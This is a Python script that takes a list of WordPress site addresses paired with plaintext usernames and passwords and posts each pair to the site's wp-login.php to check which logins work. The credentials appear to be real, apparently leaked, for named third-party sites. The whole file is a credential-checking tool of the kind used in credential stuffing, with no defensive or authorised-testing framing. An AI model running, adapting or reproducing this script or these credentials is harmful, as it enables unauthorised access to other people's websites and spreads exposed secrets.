import json
import requests
from urllib.parse import urljoin, urlparse


# Sample JSON data
data = [
    ["url", "log", "pwd"],
    ["https://bluetreeweb.com/", "dvidjhon", "8yWn2hGM3#sD5mn"],
    ["https://jurnalismewarga.net/wp-admin/", "migop12935", "9meRk5rrPzanu@Z"],
    ["blogtheday.com/ (new p)", "yahex", "Rana@0000"]
]


# Helper function to validate and extract the domain
def extract_domain(url):
    if not (url.startswith('http://') or url.startswith('https://')):
        url = 'http://' + url
    try:
        parsed_url = urlparse(url)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
        return base_url
    except Exception:
        return ""

# Asynchronous call is not natively supported in Python like in JavaScript.
# We will use the requests library to make synchronous calls for simplicity.
def call_api(endpoint, log, pwd):
    data = {'log': log, 'pwd': pwd, 'wp-submit': 'Log In'}
    try:
        response = requests.post(endpoint, data=data)
        if response.status_code == 200:
            return 'Success'
        elif response.status_code == 401:  # Unauthorized
            return 'Failed - Incorrect credentials'
        elif response.status_code == 404:  # Not found
            return 'Failed - Endpoint not found'
        else:
            return f'Failed - HTTP {response.status_code}'
    except requests.exceptions.ConnectionError:
        return 'Failed - Network issue or domain does not exist'
    except Exception as e:
        return f'Failed - {str(e)}'

# Process data
check_duplicates = {}
results = [["url", "log", "pwd", "status", "result"]]

for index, row in enumerate(data):
    if index == 0:  # Skip header
        continue

    url, log, pwd = row
    domain = extract_domain(url)
    endpoint = urljoin(domain, "/wp-login.php") if domain else ""

    identifier = f"{url}|{log}|{pwd}"
    if url in check_duplicates:
        status = "Duplicate"
        result = ""
    else:
        check_duplicates[url] = True
        status = "Unique"
        # Make API call only for unique and complete data rows
        if domain:  # Assuming 'domain' check serves as a proxy for complete data check
            result = call_api(endpoint, log, pwd)
        else:
            result = ""

    results.append([endpoint, log, pwd, status, result])

# Convert results to JSON
output_json = json.dumps(results, indent=2)
print(output_json)
